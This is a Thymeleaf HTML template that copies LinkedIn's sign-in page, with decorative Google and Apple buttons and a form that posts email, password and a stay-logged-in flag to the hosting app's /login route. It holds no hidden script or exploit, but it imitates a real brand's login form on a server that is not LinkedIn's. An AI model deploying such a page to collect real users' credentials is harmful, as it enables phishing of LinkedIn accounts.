<!DOCTYPE html>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #FFFFFF;
            position: relative;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            margin: 0;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            margin: 0;
        }
        .logo img {
            width: 100px;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .social-login {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .social-login button {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 25px;
            background-color: white;
            cursor: pointer;
            font-size: 16px;
        }
        .social-login button img {
            width: 20px;
            margin-right: 10px;
        }
        .divider {
            margin: 20px 0;
            color: #666;
            font-size: 14px;
            position: relative;
            text-align: center;
        }
        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 45%;
            height: 1px;
            background-color: #ccc;
        }
        .divider::before {
            left: 0;
        }
        .divider::after {
            right: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 95%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .form-group.password {
            position: relative;
        }
        .form-group.password a {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            text-decoration: none;
            color: #0073b1;
            font-size: 14px;
        }
        .forgot-password {
            display: block;
            margin-bottom: 15px;
            color: #0073b1;
            text-decoration: none;
            font-size: 14px;
        }
        .checkbox {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            font-size: 14px;
        }
        .checkbox input {
            margin-right: 5px;
        }
        .sign-in-btn {
            width: 100%;
            padding: 10px;
            background-color: #0073b1;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
        }
        .join-now {
            margin-top: 20px;
            font-size: 14px;
        }
        .join-now a {
            color: #0073b1;
            text-decoration: none;
        }
        footer {
            text-align: center;
            font-size: 14px;
            color: #000000E6;
            position: absolute;
            bottom: 10px;
            width: 100%;
        }
        footer a {
            color: #00000099;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>

<div class="container">
    <h2>Sign in</h2>
    <div class="social-login">
        <button>
            <img src="https://www.google.com/favicon.ico" alt="Google Icon">
            Continue with Google
        </button>
        <button>
            <img src="https://www.apple.com/favicon.ico" alt="Apple Icon">
            Sign in with Apple
        </button>
    </div>
    <div class="divider">or</div>
    <form th:action="@{/login}" method="post">
        <div class="form-group">
            <input type="text" name="username" placeholder="Email or phone" required>
        </div>
        <div class="form-group password">
            <input type="password" name="password" placeholder="Password" required>
            <a href="#">Show</a>
        </div>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="checkbox">
            <input type="checkbox" name="keepLoggedIn" id="keepLoggedIn">
            <label for="keepLoggedIn">Keep me logged in</label>
        </div>
        <button type="submit" class="sign-in-btn">Sign in</button>
    </form>
    <div class="join-now">
        New to LinkedIn? <a th:href="@{/register}" th:method="GET">Join now</a>
    </div>
</div>
